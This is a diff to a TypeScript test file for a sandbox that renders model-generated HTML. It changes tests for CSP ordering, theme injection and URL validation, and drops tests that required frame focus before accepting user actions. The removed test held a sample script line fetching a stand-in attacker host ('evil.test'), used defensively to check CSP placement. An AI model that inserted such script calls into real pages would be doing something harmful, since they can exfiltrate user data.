@@ -11,10 +11,10 @@ import { endsInsideOpenFence, genUiKindOf } from "./fence";
 import { Format, Includes, Payment, Range, Toggle } from "./functions";
 import { extractCompleteStyles, processPartialHtml } from "./partialHtml";
 import {
-  acceptsUserAction,
   buildPreviewDocument,
   buildSandboxDocument,
   MAX_FRAME_HEIGHT,
+  MAX_LINK_LENGTH,
   MAX_PROMPT_LENGTH,
   MESSAGE_TYPE,
   MIN_FRAME_HEIGHT,
@@ -103,11 +103,12 @@ describe("processPartialHtml", () => {
 const theme: ThemeSnapshot = { dark: true, variables: { "--foreground": "0 0% 98%" } };
 
 describe("sandbox documents", () => {
-  test("the CSP comes before any model markup", () => {
-    const doc = buildSandboxDocument("<script>fetch('https://evil.test')</script>", theme);
+  test("the trusted bootstrap contains no model markup and starts after the CSP", () => {
+    const doc = buildSandboxDocument(theme);
     const cspAt = doc.indexOf("Content-Security-Policy");
-    const markupAt = doc.indexOf("fetch(");
-    expect(cspAt > -1 && cspAt < markupAt).toBe(true);
+    const runtimeAt = doc.indexOf("<script>");
+    expect(cspAt > -1 && cspAt < runtimeAt).toBe(true);
+    expect(doc.includes("evil.test")).toBe(false);
     expect(doc.includes(SANDBOX_CSP)).toBe(true);
   });
 
@@ -124,7 +125,7 @@ describe("sandbox documents", () => {
   });
 
   test("theme variables and color scheme are injected", () => {
-    const doc = buildSandboxDocument("", theme);
+    const doc = buildSandboxDocument(theme);
     expect(doc.includes("--foreground:0 0% 98%;")).toBe(true);
     expect(doc.includes("color-scheme:dark")).toBe(true);
   });
@@ -176,28 +177,12 @@ describe("parseBridgeMessage", () => {
   });
 });
 
-describe("acceptsUserAction", () => {
-  test("follow-ups and links need the frame to be focused", () => {
-    const prompt = { action: "sendPrompt", text: "hi" } as const;
-    const link = { action: "openLink", url: "https://example.com/" } as const;
-    expect(acceptsUserAction(prompt, false)).toBe(false);
-    expect(acceptsUserAction(link, false)).toBe(false);
-    expect(acceptsUserAction(prompt, true)).toBe(true);
-    expect(acceptsUserAction(link, true)).toBe(true);
-  });
-
-  test("height reports are always accepted", () => {
-    const height = { action: "height", height: 200 } as const;
-    expect(acceptsUserAction(height, false)).toBe(true);
-    expect(acceptsUserAction(height, true)).toBe(true);
-  });
-});
-
 describe("safeWebUrl", () => {
   test("accepts http and https only", () => {
     expect(safeWebUrl("http://a.test/")).toBe("http://a.test/");
     expect(safeWebUrl("data:text/html,x")).toBe(null);
     expect(safeWebUrl(123)).toBe(null);
+    expect(safeWebUrl(`https://a.test/${"x".repeat(MAX_LINK_LENGTH)}`)).toBe(null);
   });
 });
 
